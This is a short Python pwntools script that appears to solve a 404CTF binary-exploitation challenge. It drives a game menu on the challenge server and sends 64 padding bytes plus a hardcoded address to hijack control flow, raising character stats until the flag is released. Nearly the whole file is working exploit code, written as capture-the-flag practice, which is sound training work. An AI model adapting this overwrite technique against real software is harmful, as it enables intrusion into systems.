#!/usr/bin/python3
#01/06/2023
#geoz

from pwn import *

req = remote("challenges.404ctf.fr", 30944)
req.recvuntil(b">>>")

def buy(req):
    req.sendline(b"1")
    return req.recvuntil(b">>>").decode()

def use(req):
    req.sendline(b"2")
    data = req.recvuntil(b">>>")
    # print(data)
    return data.decode()

def talk(req, data):
    req.sendline(b"3")
    req.recvuntil(b"[Vous]")
    req.sendline(data)
    return req.recvuntil(b">>>").decode()

def values(req):
    req.sendline(b"4")
    return req.recvuntil(b">>>").decode()

def flag(req):
    req.sendline(b"5")
    data = req.recvuntil(b"}")
    return data.decode()

def upStrength(req):
    buy(req)
    use(req)
    caract = values(req)
    strength = int(caract.split("FOR: ")[1].split("\n")[0])
    while( strength < 149):
        talk(req,b"A")
        use(req)
        caract = values(req)
        strength = int(caract.split("FOR: ")[1].split("\n")[0])
        print(f"FOR: {strength}")

def upIntellect(req):
    # address = int(buy(req).split("~ ")[1].split("\n")[0],16) + 64
    address = 0x4008d5
    # print(address)
    use(req)
    caract = values(req)
    interest = int(caract.split("INT: ")[1].split("\n")[0])
    while( interest < 149):
        # print(int.to_bytes(address, 8, 'little'))
        talk(req,b"A"*64 + int.to_bytes(address, 8, 'little') )
        use(req)
        caract = values(req)
        interest = int(caract.split("INT: ")[1].split("\n")[0])
        print(f"INT: {interest}")

upStrength(req)
talk(req,b"A")
upIntellect(req)
print(flag(req))